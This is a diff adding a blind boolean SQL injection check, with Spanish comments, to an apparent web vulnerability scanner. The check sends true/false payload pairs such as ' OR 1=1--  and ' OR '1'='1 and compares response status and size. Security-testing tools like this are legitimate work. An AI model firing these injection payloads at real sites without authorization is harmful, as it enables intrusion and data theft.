@@ -113,3 +113,95 @@ class EstrategiaPayloads:
 
 # El nombre de siempre, para los plugins que ya existen.
 Prueba = EstrategiaPayloads
+
+
+# --------------------------------------------------- booleano ciego
+# Pares (condicion verdadera, condicion falsa). Se generan a partir del
+# valor original porque hay dos formas de inyectar y las dos son comunes:
+# sustituir el valor entero (tipico en un login) y anadir al que habia
+# (tipico en una busqueda o un filtro).
+def pares_booleanos(valor: str) -> list[tuple[str, str]]:
+    return [
+        ("' OR 1=1-- ", "' OR 1=2-- "),
+        (f"{valor}' OR '1'='1", f"{valor}' OR '1'='2"),
+        (f"{valor} OR 1=1", f"{valor} OR 1=2"),
+    ]
+
+
+def firma(flujo: Flow) -> tuple[int, int]:
+    """Lo que se compara de una respuesta: estado y tamano.
+
+    No se compara el cuerpo entero a proposito: casi cualquier pagina
+    real trae algo que cambia solo —una hora, un token, un id— y comparar
+    texto daria distinto siempre. Estado y tamano son groseros, y por eso
+    mismo estables.
+    """
+    r = flujo.response
+    return (0, -1) if r is None else (r.status, len(r.body))
+
+
+def _parecidas(a: tuple[int, int], b: tuple[int, int], tolerancia: int) -> bool:
+    return a[0] == b[0] and abs(a[1] - b[1]) <= tolerancia
+
+
+@dataclass(slots=True)
+class EstrategiaBooleana:
+    """SQLi ciega por diferencia: compara condicion verdadera contra falsa.
+
+    Es la familia que caza lo que no deja rastro en la respuesta. El caso
+    que la justifica esta medido: el login de OWASP Juice Shop ES
+    inyectable y ninguna de las familias que miran la respuesta podia
+    verlo, porque no hay reflejo ni cadena de error SQL. Lo unico que lo
+    delata es que con la condicion verdadera la respuesta CAMBIA.
+
+    El riesgo de esta familia es el falso positivo, y viene de las
+    paginas que cambian solas (un token, una hora, un contador). Por eso
+    el protocolo es:
+
+      1. tomar el baseline DOS veces y medir cuanto varia por su cuenta;
+      2. si varia, no concluir nada —una pagina asi no se puede medir por
+         diferencia, y forzarlo seria inventar;
+      3. exigir que la condicion FALSA se parezca al baseline (si ya
+         cambia, lo que altero la respuesta fue inyectar algo raro, no la
+         condicion);
+      4. exigir que la VERDADERA no se parezca a la falsa.
+
+    Los cuatro pasos juntos son lo que separa «esto es inyectable» de
+    «esta pagina es inquieta».
+    """
+    nombre: str = "sqli_boolean"
+    titulo: str = "SQLi ciega por diferencia booleana"
+    wstg: list = field(default_factory=lambda: ["WSTG-INPV-05"])
+    severidad: str = "high"
+    requiere: frozenset = field(default_factory=frozenset)
+    # margen minimo de tolerancia, para no llamar «cambio» a un byte
+    piso_tolerancia: int = 16
+
+    @property
+    def peticiones(self) -> int:
+        # 2 baselines + un par (verdadera, falsa) por cada forma de inyectar
+        return 2 + 2 * len(pares_booleanos(""))
+
+    def probar(self, ctx: Contexto) -> Hallazgo | None:
+        base1 = firma(ctx.baseline())
+        base2 = firma(ctx.enviar(ctx.punto.valor))
+        if base1[0] != base2[0]:
+            return None                 # ni el estado es estable
+        ruido = abs(base1[1] - base2[1])
+        tolerancia = max(self.piso_tolerancia, ruido * 3)
+        if ruido > max(self.piso_tolerancia, base1[1] // 4):
+            return None                 # la pagina cambia sola demasiado
+
+        for verdadera, falsa in pares_booleanos(ctx.punto.valor):
+            f_falsa = firma(ctx.enviar(falsa))
+            if not _parecidas(f_falsa, base1, tolerancia):
+                continue                # inyectar ya la altero: no concluye
+            f_verdadera = firma(ctx.enviar(verdadera))
+            if not _parecidas(f_verdadera, f_falsa, tolerancia):
+                return Hallazgo(
+                    motivo=(f"la condicion verdadera cambia la respuesta "
+                            f"(falsa {f_falsa[0]}/{f_falsa[1]}B, "
+                            f"verdadera {f_verdadera[0]}/{f_verdadera[1]}B) "
+                            f"y la falsa se parece a la original"),
+                    confianza="alta", payload=verdadera)
+        return None
